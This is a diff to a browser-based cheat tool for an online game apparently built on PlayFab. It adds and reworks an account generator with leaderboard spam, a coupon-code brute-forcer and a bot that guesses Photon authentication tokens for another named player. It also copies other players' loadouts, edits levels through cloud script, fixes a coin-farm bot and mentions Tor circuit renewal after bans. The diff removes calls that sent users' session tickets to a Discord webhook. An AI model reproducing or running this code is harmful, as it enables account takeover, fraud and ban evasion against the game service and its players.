@@ -53,7 +53,7 @@
       padding-bottom: 10px;
     }
 
-    input, button, select {
+    input, button, select, textarea {
       margin: 8px 5px;
       padding: 10px;
       font-size: 16px;
@@ -261,14 +261,15 @@
     </div>
 
     <div class="section">
-      <h2>📱 IOS Features <span id="iosAutomationStatus" class="status-indicator status-inactive"></span></h2>
+      <h2>📱 Account Generator + Spam Leaderboard (IOS) <span id="iosAutomationStatus" class="status-indicator status-inactive"></span></h2>
       <input id="displayNameIOS" placeholder="Enter Display Name" type="text">
       <select id="platformNameSelect">
         <option value="IOS">IOS</option>
         <option value="PS4">PS4</option>
+        <option value="Random">Random</option>
       </select>
       <div class="grid-2">
-        <button class="ios-automation-btn" onclick="Automation()" id="iosAutomationToggleButton">Start IOS Automation</button>
+        <button class="ios-automation-btn" onclick="toggleIOSAutomation()" id="iosAutomationToggleButton">Start Account Generator + Spam Leaderboard</button>
         <button class="ios-leaderboard-btn" onclick="viewIOSLeaderboard()">View IOS Leaderboard</button>
       </div>
       <div>
@@ -329,11 +330,7 @@
       <h2>🧪 Level Editor (STEAM) <span id="levelEditorStatus" class="status-indicator status-inactive"></span></h2>
       <input type="text" id="classIdInput" placeholder="Class ID">
       <input type="number" id="receivedXPInput" placeholder="Received XP">
-      <input type="number" id="xpInput" placeholder="XP">
-      <input type="number" id="xpToNextLevelInput" placeholder="XP to Next Level">
-      <input type="number" id="levelInput" placeholder="Level">
-      <input type="number" id="perkSlotsInput" placeholder="Available Perk Slots (max 3)" max="3" min="0">
-      <input type="number" id="playerLevelInput" placeholder="Player Level">
+      <textarea id="levelProgressionJson" placeholder="Paste full currentLevelProgression JSON here (including playerLevel and classLevel array)" rows="10"></textarea>
       <button onclick="toggleLevelEditor()" id="levelEditorToggleButton">Start Level Editor</button>
       <div class="output" id="levelProgressionOutput">Level progression results will appear here...</div>
     </div>
@@ -531,7 +528,7 @@
     let totalTokensGenerated = 0;
     let attempts = 0;
     const iosAutomationLog = [];
-    const logEntries = []; // For Photon Token Bruteforcer
+    const bruteforceLog = []; // For Photon Token Bruteforcer valid tokens
 
     function logIOSAction(action, details) {
       iosAutomationLog.push({
@@ -541,10 +538,10 @@
       });
     }
 
-    function downloadLogAsJSON() {
+    function downloadLogAsJSON(log, filenamePrefix) {
       const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-      const filename = `ios_automation_log_${timestamp}.json`;
-      const blob = new Blob([JSON.stringify(iosAutomationLog, null, 2)], { type: 'application/json' });
+      const filename = `${filenamePrefix}_${timestamp}.json`;
+      const blob = new Blob([JSON.stringify(log, null, 2)], { type: 'application/json' });
       const url = URL.createObjectURL(blob);
       const link = document.createElement('a');
       link.href = url;
@@ -553,6 +550,42 @@
       link.click();
       document.body.removeChild(link);
       URL.revokeObjectURL(url);
+    }
+
+    async function fetchPlayerInfo(titleId, sessionTicket, tokenStatus) {
+      const accountData = await makeApiCall("Client/GetAccountInfo", "POST", {}, titleId, sessionTicket);
+      if (accountData.error) {
+        tokenStatus.textContent += `\n❌ Error fetching account info: ${accountData.error}`;
+        return;
+      }
+      const playFabId = accountData.data.AccountInfo.PlayFabId;
+
+      const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
+        PlayFabId: playFabId,
+        InfoRequestParameters: {
+          GetPlayerProfile: true,
+          GetUserAccountInfo: true
+        }
+      }, titleId, sessionTicket);
+      if (combinedData.error) {
+        tokenStatus.textContent += `\n❌ Error fetching combined info: ${combinedData.error}`;
+        return;
+      }
+
+      let infoText = "Player Info:\n";
+      const payload = combinedData.data.InfoResultPayload;
+      if (payload.AccountInfo) {
+        infoText += `PlayFabId: ${payload.AccountInfo.PlayFabId}\n`;
+        infoText += `Username: ${payload.AccountInfo.Username || "N/A"}\n`;
+        infoText += `Created: ${new Date(payload.AccountInfo.Created).toLocaleString()}\n`;
+      }
+      if (payload.PlayerProfile) {
+        infoText += `DisplayName: ${payload.PlayerProfile.DisplayName || "N/A"}\n`;
+        infoText += `LastLogin: ${new Date(payload.PlayerProfile.LastLogin).toLocaleString()}\n`;
+      }
+
+      tokenStatus.textContent += "\n" + infoText;
+      tokenStatus.scrollTop = tokenStatus.scrollHeight;
     }
 
     function setSessionTicket() {
@@ -565,7 +598,7 @@
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
         console.log("SessionTicket set (STEAM):", sessionTicket);
-        sendToDiscordWebhook(sessionTicket);
+        fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
         tokenStatus.style.display = "block";
@@ -616,7 +649,7 @@
           tokenStatus.textContent = "✅ Session ticket renewed successfully!";
           tokenStatus.style.color = "green";
           console.log("SessionTicket renewed (STEAM):", sessionTicket);
-          sendToDiscordWebhook(sessionTicket);
+          fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus);
         } else {
           tokenStatus.textContent = `❌ Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
           tokenStatus.style.color = "red";
@@ -663,6 +696,7 @@
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
         console.log("SessionTicket set (IOS):", sessionTicketIOS);
+        fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatus);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
         tokenStatus.style.display = "block";
@@ -713,6 +747,7 @@
           tokenStatus.textContent = "✅ Session ticket renewed successfully!";
           tokenStatus.style.color = "green";
           console.log("SessionTicket renewed (IOS):", sessionTicketIOS);
+          fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatus);
         } else {
           tokenStatus.textContent = `❌ Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
           tokenStatus.style.color = "red";
@@ -752,7 +787,7 @@
       return result;
     }
 
-  async function toggleIOSAutomation() {
+    async function toggleIOSAutomation() {
       const output = document.getElementById("iosOutput");
       const displayNameBase = document.getElementById("displayNameIOS").value.trim();
       let platformName = document.getElementById("platformNameSelect").value;
@@ -766,10 +801,10 @@
         clearInterval(iosAutomationIntervalId);
         iosAutomationRunning = false;
         document.getElementById("iosAutomationStatus").className = "status-indicator status-inactive";
-        document.getElementById("iosAutomationToggleButton").textContent = "Start IOS Automation";
-        output.textContent += "\nIOS Automation stopped manually.\n";
-        logIOSAction("Automation Stopped", { message: "IOS Automation stopped manually" });
-        downloadLogAsJSON();
+        document.getElementById("iosAutomationToggleButton").textContent = "Start Account Generator + Spam Leaderboard";
+        output.textContent += "\nAccount Generator + Spam Leaderboard stopped manually.\n";
+        logIOSAction("Automation Stopped", { message: "Account Generator + Spam Leaderboard stopped manually" });
+        downloadLogAsJSON(iosAutomationLog, "ios_automation_log");
         iosAutomationLog.length = 0; // Clear log after download
         output.scrollTop = output.scrollHeight;
         return;
@@ -784,9 +819,9 @@
 
       iosAutomationRunning = true;
       document.getElementById("iosAutomationStatus").className = "status-indicator status-active";
-      document.getElementById("iosAutomationToggleButton").textContent = "Stop IOS Automation";
-      output.textContent = `Starting IOS Automation (Platform: ${platformName})...\n`;
-      logIOSAction("Automation Started", { message: "IOS Automation started", platformName });
+      document.getElementById("iosAutomationToggleButton").textContent = "Stop Account Generator + Spam Leaderboard";
+      output.textContent = `Starting Account Generator + Spam Leaderboard (Platform: ${platformName})...\n`;
+      logIOSAction("Automation Started", { message: "Account Generator + Spam Leaderboard started", platformName });
 
       async function runIOSAutomationCycle() {
         try {
@@ -814,6 +849,10 @@
             output.textContent += `❌ Failed to create account: ${errorMsg}\n`;
             logIOSAction("Account Creation Failed", { playerId, error: errorMsg });
             output.style.color = "red";
+            if (errorMsg.includes("Account Banned")) {
+              // Tor circuit renewal not possible in standard browser JS
+              console.log("Account Banned - Tor circuit renewal not supported in this environment.");
+            }
             return;
           }
 
@@ -1402,33 +1441,46 @@
 
     async function submitLevelProgression() {
       const classId = document.getElementById("classIdInput").value.trim();
-      const receivedXP = parseInt(document.getElementById("receivedXPInput").value);
-      const XP = parseInt(document.getElementById("xpInput").value);
-      const XpToNextLevel = parseInt(document.getElementById("xpToNextLevelInput").value);
-      const level = parseInt(document.getElementById("levelInput").value);
-      const availablePerkSlotsCount = Math.min(parseInt(document.getElementById("perkSlotsInput").value), 3);
-      const playerLevel = parseInt(document.getElementById("playerLevelInput").value);
+      const receivedXP = parseInt(document.getElementById("receivedXPInput").value) || 0;
+      const jsonInput = document.getElementById("levelProgressionJson").value.trim();
 
-      if (!classId || isNaN(receivedXP) || isNaN(XP) || isNaN(XpToNextLevel) || 
-          isNaN(level) || isNaN(availablePerkSlotsCount) || isNaN(playerLevel)) {
-        return { error: "Please fill in all fields correctly." };
+      let currentLevelProgression;
+
+      if (jsonInput) {
+        try {
+          currentLevelProgression = JSON.parse(jsonInput);
+        } catch (e) {
+          return { error: "Invalid JSON in level progression field." };
+        }
+      } else {
+        // Fallback to single class if no JSON provided
+        const XP = parseInt(document.getElementById("xpInput").value);
+        const XpToNextLevel = parseInt(document.getElementById("xpToNextLevelInput").value);
+        const level = parseInt(document.getElementById("levelInput").value);
+        const availablePerkSlotsCount = Math.min(parseInt(document.getElementById("perkSlotsInput").value), 3);
+        const playerLevel = parseInt(document.getElementById("playerLevelInput").value);
+
+        if (!classId || isNaN(receivedXP) || isNaN(XP) || isNaN(XpToNextLevel) || 
+            isNaN(level) || isNaN(availablePerkSlotsCount) || isNaN(playerLevel)) {
+          return { error: "Please fill in all fields correctly or provide JSON." };
+        }
+
+        currentLevelProgression = {
+          playerLevel,
+          classLevel: [{
+            classId,
+            XP,
+            XpToNextLevel,
+            level,
+            availablePerkSlotsCount
+          }]
+        };
       }
-
-      const currentLevelProgression = {
-        playerLevel,
-        classLevel: [{
-          classId,
-          XP,
-          XpToNextLevel,
-          level,
-          availablePerkSlotsCount
-        }]
-      };
 
       const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
         FunctionName: "setLevelProgressionForClass",
         FunctionParameter: {
-          classId,
+          classId: classId || "All",
           receivedXP,
           currentLevelProgression: JSON.stringify(currentLevelProgression)
         },
@@ -1668,7 +1720,7 @@
     async function toggleCoinFarmBot() {
       const cloudOutput = document.getElementById("cloudOutput");
       if (coinFarmBotRunning) {
-        clearInterval(coinFarmId);
+        clearInterval(coinFarmIntervalId);
         coinFarmBotRunning = false;
         document.getElementById("botStatus").className = "status-indicator status-inactive";
         document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
@@ -1807,7 +1859,7 @@
       }
 
       runCoinFarmCycle();
-      coinFarmId = setInterval(runCoinFarmCycle, delayMs);
+      coinFarmIntervalId = setInterval(runCoinFarmCycle, delayMs);
     }
 
     async function toggleLevelEditor() {
@@ -1860,7 +1912,15 @@
       output.textContent = "Starting coupon bruteforce...\n";
 
       async function attemptRedeemCoupon() {
-        const couponCode = Math.random().toString(36).substring(2, 10).toUpperCase();
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        function gen(len) {
+          let s = '';
+          for (let i = 0; i < len; i++) {
+            s += chars[Math.floor(Math.random() * chars.length)];
+          }
+          return s;
+        }
+        const couponCode = gen(3) + '-' + gen(4) + '-' + gen(3);
         output.textContent += `Trying coupon code: ${couponCode}\n`;
 
         const data = await makeApiCall("Client/RedeemCoupon", "POST", {
@@ -1912,7 +1972,7 @@
 
     async function resetLoadout() {
       const output = document.getElementById("resetLoadoutOutput");
-      const getData = await makeApiCall("Client/GetUserData", "POST", {});
+      const getData = await makeApiCall("Client/GetUserData", "POST", {}, titleIdMain, sessionTicket);
       if (getData.error) {
         output.textContent = `Error getting data: ${getData.error}`;
         return;
@@ -1920,7 +1980,7 @@
       if (getData.data.Data && "loadout" in getData.data.Data) {
         const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
           Data: { loadout: null }
-        });
+        }, titleIdMain, sessionTicket);
         if (updateData.error) {
           output.textContent = `Error resetting: ${updateData.error}`;
         } else {
@@ -1941,7 +2001,7 @@
       const getData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
         PlayFabId: targetId,
         InfoRequestParameters: { GetUserData: true }
-      });
+      }, titleIdMain, sessionTicket);
       if (getData.error) {
         output.textContent = `Error getting data: ${getData.error}`;
         return;
@@ -1951,7 +2011,7 @@
         const loadoutValue = userData.loadout.Value;
         const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
           Data: { loadout: loadoutValue }
-        });
+        }, titleIdMain, sessionTicket);
         if (updateData.error) {
           output.textContent = `Error updating: ${updateData.error}`;
         } else {
@@ -1988,7 +2048,7 @@
           if (data.data && data.data.PhotonCustomAuthenticationToken) {
             totalTokensGenerated++;
             output.textContent += `\n✅ Generated Token #${totalTokensGenerated}: ${data.data.PhotonCustomAuthenticationToken}\n`;
-            logEntries.push({
+            bruteforceLog.push({
               time: new Date().toLocaleTimeString(),
               token: data.data.PhotonCustomAuthenticationToken
             });
@@ -2026,31 +2086,26 @@
         attempts++;
         output.textContent += `\nAttempt #${attempts}\n`;
 
-        try {
-          const tokenData = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
-            PhotonApplicationId: "dc2c609b-3a3d-4a79-b0e0-6d6e7c630e9e"
-          }, titleIdMain, sessionTicket);
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        let token = '';
+        for (let i = 0; i < 50; i++) {
+          token += chars[Math.floor(Math.random() * 36)];
+        }
 
-          if (tokenData.data && tokenData.data.PhotonCustomAuthenticationToken) {
-            output.textContent += `✅ Generated Token: ${tokenData.data.PhotonCustomAuthenticationToken}\n`;
-            logEntries.push({
-              time: new Date().toLocaleTimeString(),
-              token: tokenData.data.PhotonCustomAuthenticationToken
+        try {
+          const response = await fetch(`https://${titleIdMain}.playfabapi.com/photon/authenticate?username=${playFabUsername}&token=${token}`);
+          const data = await response.json();
+
+          output.textContent += `Generated Token: ${token}\n`;
+          if (data.resultCode === 1) {
+            output.textContent += `✅ Valid Token!\n`;
+            bruteforceLog.push({
+              time: new Date().toISOString(),
+              token: token,
+              playFabId: playFabUsername
             });
           } else {
-            output.textContent += `❌ Failed to generate token: ${tokenData.error || "Unknown error"}\n`;
-          }
-
-          const checkData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-            FunctionName: "checkPlayerToken",
-            FunctionParameter: { targetPlayFabId: playFabUsername },
-            GeneratePlayStreamEvent: true
-          }, titleIdMain, sessionTicket);
-
-          if (checkData.data && checkData.data.FunctionResult) {
-            output.textContent += `✅ Token Check Result: ${JSON.stringify(checkData.data.FunctionResult)}\n`;
-          } else {
-            output.textContent += `❌ Token Check Failed: ${checkData.error || "Unknown error"}\n`;
+            output.textContent += `❌ Invalid (resultCode: ${data.resultCode})\n`;
           }
         } catch (err) {
           output.textContent += `❌ Error: ${err.message}\n`;
@@ -2066,6 +2121,8 @@
       if (bruteforceRunning) {
         bruteforceRunning = false;
         document.getElementById("bruteforceOutput").textContent += "\nBruteforce stopped manually.";
+        downloadLogAsJSON(bruteforceLog, "bruteforce_log");
+        bruteforceLog.length = 0;
       }
     }
 
@@ -2079,6 +2136,7 @@
         tokenStatus.textContent = "✅ Token loaded from storage!";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
+        fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus);
       }
       const savedTicketIOS = localStorage.getItem('sessionTicketIOS');
       if (savedTicketIOS) {
@@ -2088,6 +2146,7 @@
         tokenStatusIOS.textContent = "✅ Token loaded from storage!";
         tokenStatusIOS.style.display = "block";
         tokenStatusIOS.style.color = "green";
+        fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatusIOS);
       }
     });
   </script>
